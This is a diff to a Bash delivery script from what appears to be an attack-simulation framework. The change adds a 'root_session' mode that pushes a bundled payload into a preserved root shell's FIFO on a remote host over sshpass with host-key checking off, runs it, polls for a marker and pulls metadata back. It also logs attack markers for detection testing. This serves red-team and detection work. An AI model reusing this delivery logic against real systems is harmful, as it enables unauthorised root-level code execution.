@@ -41,6 +41,10 @@ normalize_payload_name() {
     printf '%s\n' "$payload"
 }
 
+shell_quote() {
+    printf "%q" "$1"
+}
+
 emit_embedded_template_pool() {
     local template_name="$1"
     local template_file="$2"
@@ -161,7 +165,7 @@ safe_remote_rm_file() {
 
     case "$path" in
     /tmp/aegis_* | /var/tmp/aegis_* | /dev/shm/aegis_* | /tmp/* | /var/tmp/* | /dev/shm/*)
-        if [[ "${TYPE:-}" == "ssh_auth" ]]; then
+        if [[ "${TYPE:-}" == "ssh_auth" || ( "${TYPE:-}" == "root_session" && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ) ]]; then
             sshpass -p "$PASSWORD" \
                 ssh -o StrictHostKeyChecking=no \
                 -o UserKnownHostsFile=/dev/null \
@@ -197,6 +201,55 @@ run_delivery_cleanup() {
             record_metadata "delivery_cleanup_local_path=$path"
             rm -f -- "$path" >/dev/null 2>&1 || true
         done
+    fi
+}
+
+ssh_remote_command() {
+    local target="$1"
+    local command="$2"
+
+    if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+        sshpass -p "$PASSWORD" \
+            ssh -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o LogLevel=ERROR \
+            "$USERNAME@$target" \
+            "$command"
+    else
+        ssh "$target" "$command"
+    fi
+}
+
+scp_from_remote() {
+    local target="$1"
+    local remote_path="$2"
+    local local_path="$3"
+
+    if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+        sshpass -p "$PASSWORD" \
+            scp -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o LogLevel=ERROR \
+            "$USERNAME@$target:$remote_path" \
+            "$local_path"
+    else
+        scp "$target:$remote_path" "$local_path"
+    fi
+}
+
+send_delivery_marker() {
+    local marker="$1"
+    local q_marker
+
+    q_marker="$(shell_quote "$marker")"
+
+    if [[ "${TYPE:-}" == "root_session" && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+        ssh_remote_command "$TARGET" "logger -t aegis_attack_marker -- $q_marker" || {
+            warn "Failed to send marker to target: $marker"
+            return 1
+        }
+    else
+        send_marker "$MARKER_TARGET" "$marker"
     fi
 }
 
@@ -317,7 +370,7 @@ record_metadata "finished_at=$(date -Is)"
 ' EXIT
 
 if [[ "${TYPE:-}" != "ssh_auth" ]]; then
-    send_marker "$MARKER_TARGET" "$START_MARKER"
+    send_delivery_marker "$START_MARKER"
 fi
 
 log "Run ID: $RUN_ID"
@@ -532,6 +585,117 @@ bind_shell)
 
     ;;
 
+root_session)
+
+    [[ "${SESSION_TYPE:-}" == "fifo" ]] ||
+        fail "root_session delivery only supports SESSION_TYPE=fifo"
+
+    [[ -n "${SESSION_INPUT:-}" ]] ||
+        fail "SESSION_INPUT/AEGIS_SHELL_SESSION_INPUT must be set for root_session delivery"
+
+    [[ -n "${SESSION_TRANSCRIPT:-}" ]] ||
+        fail "SESSION_TRANSCRIPT/AEGIS_SHELL_SESSION_TRANSCRIPT must be set for root_session delivery"
+
+    BUNDLE_SCRIPT="$RUN_DIR/bundled_payload_root_session.sh"
+    SESSION_COMMANDS="$RUN_DIR/root_session_commands.sh"
+    SESSION_MARKER="__AEGIS_ROOT_SESSION_DONE_${RUN_ID}__"
+    SESSION_PAYLOAD_PATH="/tmp/aegis_root_session_${RUN_ID}.sh"
+
+    q_session_input="$(shell_quote "$SESSION_INPUT")"
+    q_session_transcript="$(shell_quote "$SESSION_TRANSCRIPT")"
+    q_session_payload_path="$(shell_quote "$SESSION_PAYLOAD_PATH")"
+    q_session_marker="$(shell_quote "$SESSION_MARKER")"
+
+    log "Building bundled payload for preserved root shell session"
+
+    {
+        echo '#!/usr/bin/env bash'
+        echo 'set -euo pipefail'
+        echo
+        emit_bundled_framework
+        echo
+        echo "RUN_ID='$RUN_ID'"
+        echo "CHAIN_ID='$CHAIN_ID'"
+        echo "TARGET_USER='${TARGET_USER:-}'"
+        echo "USERNAME='${USERNAME:-}'"
+        echo "PASSWORD='${PASSWORD:-}'"
+        echo "METADATA_TXT='/tmp/aegis_${RUN_ID}_metadata.txt'"
+        echo "METADATA_JSON='/tmp/aegis_${RUN_ID}_metadata.json'"
+        echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
+        echo
+        sed '/^#/d' "$PAYLOAD_CONF"
+        echo
+        sed \
+            -e '/FRAMEWORK_ROOT must be set/d' \
+            -e '/if \[\[ -z "${FRAMEWORK_ROOT:-}" \]\]; then/,/fi/d' \
+            -e '/source "\$FRAMEWORK_ROOT\/lib\//d' \
+            "$PAYLOAD_SCRIPT"
+    } >"$BUNDLE_SCRIPT"
+
+    chmod +x "$BUNDLE_SCRIPT"
+
+    {
+        printf 'cat > %s <<'\''__AEGIS_ROOT_SESSION_PAYLOAD_%s__'\''\n' \
+            "$q_session_payload_path" "$RUN_ID"
+        cat "$BUNDLE_SCRIPT"
+        printf '__AEGIS_ROOT_SESSION_PAYLOAD_%s__\n' "$RUN_ID"
+        printf 'bash %s\n' "$q_session_payload_path"
+        printf 'AEGIS_ROOT_SESSION_STATUS=$?\n'
+        printf 'rm -f -- %s\n' "$q_session_payload_path"
+        printf 'echo %s:${AEGIS_ROOT_SESSION_STATUS}\n' "$q_session_marker"
+    } >"$SESSION_COMMANDS"
+
+    record_metadata "root_session_input=$SESSION_INPUT"
+    record_metadata "root_session_transcript=$SESSION_TRANSCRIPT"
+    record_metadata "root_session_marker=$SESSION_MARKER"
+
+    log "Feeding payload into preserved root shell session"
+
+    if ! ssh_remote_command "$TARGET" "test -p $q_session_input"; then
+        fail "Root session FIFO is not available: $SESSION_INPUT"
+    fi
+
+    ssh_remote_command "$TARGET" "cat > $q_session_input" <"$SESSION_COMMANDS"
+
+    log "Waiting for preserved root shell session marker"
+
+    SESSION_DEADLINE=$((SECONDS + SESSION_COMMAND_TIMEOUT))
+
+    while (( SECONDS < SESSION_DEADLINE )); do
+        if ssh_remote_command "$TARGET" "grep -q -- $q_session_marker $q_session_transcript" >/dev/null 2>&1; then
+            break
+        fi
+        sleep "$SESSION_POLL_INTERVAL"
+    done
+
+    if ! ssh_remote_command "$TARGET" "grep -q -- $q_session_marker $q_session_transcript" >/dev/null 2>&1; then
+        fail "Timed out waiting for root session marker: $SESSION_MARKER"
+    fi
+
+    SESSION_STATUS="$(
+        ssh_remote_command "$TARGET" "grep -F -- $q_session_marker $q_session_transcript | tail -n 1 | sed 's/^.*://'"
+    )"
+    SESSION_STATUS="$(
+        printf '%s' "$SESSION_STATUS" |
+            tr -cd '0-9'
+    )"
+
+    record_metadata "root_session_status=$SESSION_STATUS"
+
+    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
+    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
+
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
+
+    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
+    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
+
+    [[ "$SESSION_STATUS" == "0" ]] ||
+        fail "Root session payload failed with status: $SESSION_STATUS"
+
+    ;;
+
 ssh_auth)
 
     USERNAME="${USERNAME:-}"
@@ -626,7 +790,7 @@ local_controller)
 esac
 
 if [[ "${TYPE:-}" != "ssh_auth" ]]; then
-    send_marker "$MARKER_TARGET" "$END_MARKER"
+    send_delivery_marker "$END_MARKER"
 fi
 
 record_metadata "success=true"
